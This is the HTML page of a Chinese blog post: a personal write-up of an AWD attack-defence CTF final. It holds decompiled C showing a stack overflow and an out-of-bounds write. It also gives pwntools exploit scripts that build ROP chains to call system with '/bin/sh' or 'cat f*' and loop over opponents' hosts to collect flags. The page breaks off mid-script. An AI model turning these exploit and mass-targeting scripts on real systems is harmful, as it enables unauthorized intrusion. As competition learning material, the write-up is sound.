@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>磐石行动决赛 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="磐石行动决赛磐石行动决赛在上海东华大学举办。第一次参加线下赛，心情十分紧张，但更多的是兴奋。 线下的赛制是AWD。是之前完全没有接触过的。在开赛前几天，网上找了找AWD的一些小技巧，可是到了真正比赛的时候，差距还是很大的。这篇文章就是记录下自己的感受和经历吧…真的太累了。 一.开赛后的一小时在比赛前我只知道AWD基本上是web和pwn方向。同时在pwn的方向会有附件供我们修改并patch到服务器，">
+<meta property="og:type" content="website">
+<meta property="og:title" content="磐石行动决赛">
+<meta property="og:url" content="http://example.com/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="磐石行动决赛磐石行动决赛在上海东华大学举办。第一次参加线下赛，心情十分紧张，但更多的是兴奋。 线下的赛制是AWD。是之前完全没有接触过的。在开赛前几天，网上找了找AWD的一些小技巧，可是到了真正比赛的时候，差距还是很大的。这篇文章就是记录下自己的感受和经历吧…真的太累了。 一.开赛后的一小时在比赛前我只知道AWD基本上是web和pwn方向。同时在pwn的方向会有附件供我们修改并patch到服务器，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-09-20T01:21:51.000Z">
+<meta property="article:modified_time" content="2026-09-20T04:05:36.811Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/09/20/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%86%B3%E8%B5%9B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '磐石行动决赛',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">磐石行动决赛</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="磐石行动决赛"><a href="#磐石行动决赛" class="headerlink" title="磐石行动决赛"></a>磐石行动决赛</h1><p>磐石行动决赛在上海东华大学举办。第一次参加线下赛，心情十分紧张，但更多的是兴奋。</p>
+<p>线下的赛制是AWD。是之前完全没有接触过的。在开赛前几天，网上找了找AWD的一些小技巧，可是到了真正比赛的时候，差距还是很大的。这篇文章就是记录下自己的感受和经历吧…真的太累了。</p>
+<h2 id="一-开赛后的一小时"><a href="#一-开赛后的一小时" class="headerlink" title="一.开赛后的一小时"></a>一.开赛后的一小时</h2><p>在比赛前我只知道AWD基本上是web和pwn方向。同时在pwn的方向会有附件供我们修改并patch到服务器，替换掉存在漏洞的服务器。可是在真正经历了以后才发现问题。</p>
+<p>首先平台会提供给你四台靶机的ip和附件。但是这里的附件是一串公钥信息。你需要通过ssh连接到属于你的靶机。然后dump下来附件修改后并patch上去。</p>
+<p>问题就是如果你直接用提供的公钥信息会报错为<code>public key</code>或是<code>too open</code>意思是太过开放。还好主办方提供了解决方法。可是是写在平台公告里，导致我们浪费了很多时间。</p>
+<p>等我们通过终端连接到服务器后。我又在找附件的过程中花费了很多时间，也是对赛制的不熟悉吧。平台更新信息有延迟。等我刷新平台后，才出现了题目的描述…这才找到了附件（其实还挺明显的</p>
+<p>然后怎么dump下来又是个问题。显然主包Linux指令学的不是很到位。幸好队友给了神秘小工具，有了GUI界面一切都好。</p>
+<h2 id="二-拿到附件后"><a href="#二-拿到附件后" class="headerlink" title="二.拿到附件后"></a>二.拿到附件后</h2><h3 id="第一台靶机"><a href="#第一台靶机" class="headerlink" title="第一台靶机"></a>第一台靶机</h3><p>拿到第一台靶机的附件，已经经过了挺多轮次的攻击了。其实在场的师傅们也很少有一开始就采取行动的。大家应该都是缺少经验。然后我们开始了逆向分析。</p>
+<p>程序逻辑实现了一个打怪逻辑。可是正常程序流程是肯定拿不到shell的。</p>
+<p>其实第一个漏洞十分明显。具有0x50的栈溢出。同时防御手段几乎没有。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_character</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( hero_created )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You already have a character!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your hero&#x27;s name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[v2 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">      buf[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(hero, buf, <span class="number">0x3Fu</span>LL);</span><br><span class="line">  byte_4041FF = <span class="number">0</span>;</span><br><span class="line">  init_hero();</span><br><span class="line">  hero_created = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome, brave %s! Your adventure begins!\n&quot;</span>, hero);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;HP: %d, Attack: %d, Defense: %d\n&quot;</span>, dword_404200, dword_404208, dword_40420C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里的read明显存在栈溢出。同时程序存在<code>pop rdi</code>。所以我的第一想法是去打ret2libc，跳转回这个函数，再打一次ret2system。可惜失败了。因为这里会校验你是不是第一次进入这个函数。如果不是就会失败。那就会说，我完全可以通过跳转到程序的中段啊。是这样没错，但是在动态调试的过程中，<code>init_hero()</code>会打断调试的过程。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_hero</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+Fh] [rbp-1h] BYREF</span></span><br><span class="line"></span><br><span class="line">  n100 = <span class="number">100</span>;</span><br><span class="line">  n100_0 = <span class="number">100</span>;</span><br><span class="line">  n10 = <span class="number">10</span>;</span><br><span class="line">  n5 = <span class="number">5</span>;</span><br><span class="line">  qword_404210 = <span class="number">0LL</span>;</span><br><span class="line">  n3 = <span class="number">3</span>;</span><br><span class="line">  system(<span class="string">&quot;echo 2&gt;/dev/null&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(&amp;s, <span class="number">0LL</span>, format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>system(&quot;echo 2&gt;/dev/null&quot;);</code>会强制在终端输出换行。所以导致我们ptrace跟踪的进程会崩。所以我们不好判断是否需要垫栈。反正我当时写的payload是失败了。所以导致我当时很慌，因为我觉得这题明显是可以写的。</p>
+<p>幸好，主包很快换了个思路。这里的<code>strncpy</code>会根据从<code>buf</code>复制<code>0x3f</code>到<code>hero</code>（bss.段</p>
+<p>所以我们可以通过一次ret2rop就直接getshell。因为程序里已经提供了system函数的地址。我们只需要把shell复制到<code>hero</code>就可以执行任意命令了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x4041c0</span></span><br><span class="line">sys = <span class="number">0x401120</span></span><br><span class="line">rdi = <span class="number">0x401ce3</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl = pl.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pl += p64(rdi) + p64(binsh) + p64(rdi+<span class="number">1</span>) + p64(sys)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>脚本还是很简单的。可是问题是，现场除了我们之外，一共还有29台靶机。也就是说，如果我们一台一台靶机去获取flag，并且提交，一定是十分耗时的。情况也确实如此。一开始我都是手写的。然后就导致我根本没有时间去看另外的漏洞。队友们也在和web靶机斗智斗勇。同时，由于主办方没有直接给出其他队伍靶机的交互端口（应该也是个考核点。所以导致我们去扫活端口也花费了些时间….</p>
+<h3 id="半自动脚本编写"><a href="#半自动脚本编写" class="headerlink" title="半自动脚本编写"></a>半自动脚本编写</h3><p>为了解决这个问题，所以我打算改进下payload，至少能做到直接获取flag，而不需要人再去一个个输入了。</p>
+<p>可能是shell拿惯了。所以导致我经常让system直接执行shell了。如果在当前脚本的任何位置加<code>io.send(b&#39;cat flag&#39;)</code>都是会出问题的。应该是IO流的问题。在<code>interactive()</code>后应该是从我们键盘来输入数据了。我们再发送的话，会被看做简单的字符串（我的推测</p>
+<p>其实解决方法很简单，把<code>/bin/sh\x00</code>改成<code>cat flag</code>就可以了。</p>
+<p>所以下面是我写的循环脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;10.100.&#123;&#125;.1&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line">        prot = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">            <span class="comment"># print ip</span></span><br><span class="line">        io = remote(ip,<span class="built_in">int</span>(prot))</span><br><span class="line">        exp()</span><br><span class="line">        flag = io.recvline()</span><br><span class="line">        success(flag)</span><br><span class="line">        FLAG += flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment">#print(ip)</span></span><br><span class="line">        io.close()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(FLAG)</span><br></pre></td></tr></table></figure>
+
+<p>那么exp也只需要把flag接收就行了，这里的逻辑就不具体实现了。</p>
+<p>最后我们得到的flag都会被写入<code>FLAG</code>文件，然后再由人工一个个去交。</p>
+<p>最后的时间，我让队友去帮我交每一轮的flag，自己又重新去审视了两个附件。其中一道题描述为<code>crypto-v8</code>我以为是浏览器安全，打开ida逆向看了一眼，也是很复杂，手逆十分困难。所以我就先跳过了。加了个通防，还好check过了。所以这题没怎么被打破，也没得到分。</p>
+<h2 id="三-最后半小时"><a href="#三-最后半小时" class="headerlink" title="三.最后半小时"></a>三.最后半小时</h2><p>最后我又去代审第一台靶机。发现了一个<code>oob</code>漏洞。可惜等我刚把脚本写完就已经结束了…空悲切</p>
+<p>如果加上这个脚本，应该是能一轮跑出来20个flag。现在一轮只有15个flag。也是十分可惜。给第一台靶机加通防的时候也是失败了。check失败被扣了将近100分，后面就一直在被打。</p>
+<p>刚刚再写这篇博客的时候，突然想到了关键所在。应该是<code>init_hero()</code>里会系统调用system。底层逻辑还是<code>execve</code>。所以加了通防把<code>execve</code>给ban了就会导致check不过。可惜</p>
+<p>然后这里第二个漏洞在于<code>chat()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n2; <span class="comment">// [rsp+100h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+104h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+108h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+10Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !hero_created )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t created a character yet!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter chat index (-1 to exit): &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = <span class="number">4</span> * v4;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Chat Menu:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Read word  2. Write word&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n2);</span><br><span class="line">    <span class="keyword">if</span> ( n2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = *(_DWORD *)&amp;v1[v5];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Value at offset %d: %d (0x%x)\n&quot;</span>, v5, v3, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n2 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter value: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      *(_DWORD *)&amp;v1[v5] = v3;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Value written!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Chat ended.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里存在不限次数的任意地址读写。理论上我们可以覆盖所有的地址。所以这里唯一需要确定的其实就是偏移了。</p>
+<p>由于这里是以<code>_DWORD</code>的形式写入，所以不管是读还是写都是四字节。所以如果要写入长地址就需要分批次写入。知道这个要点以后。其实我们就可以控制写入位置为rip，然后写rop链了。不过需要注意的是，我们需要写入十进制数。所以可能这个会卡一会。</p>
+<p>所以这里的难点就是去找偏移。反正我是一点点动调的，也可以用计算机算一下。其实理论上来说orw更稳，但是写入的成本也更多，花费时间更久。而且gadget不一定全。加沙箱也不一定能满足有orw。所以这里还是去<code>cat flag</code>。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mode</span>(<span class="params">idx,ch</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;10.100.&#123;&#125;.1&quot;</span>.<span class="built_in">format</span>(x)</span><br><span class="line">        prot = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line">            <span class="comment"># print ip</span></span><br><span class="line">        io = remote(ip,<span class="built_in">int</span>(prot))</span><br><span class="line">        <span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">        pl = <span class="string">b&#x27;cat f*&#x27;</span></span><br><span class="line">        pl = pl.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        io.send(pl)</span><br><span class="line">        mode(<span class="number">70</span>,<span class="number">2</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;4201699&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;73&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;72&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;4211136&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;75&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;74&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;4201700&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;77&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;exit): &#x27;</span>,<span class="string">b&#x27;76&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Chat Menu:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter value: &#x27;</span>,<span 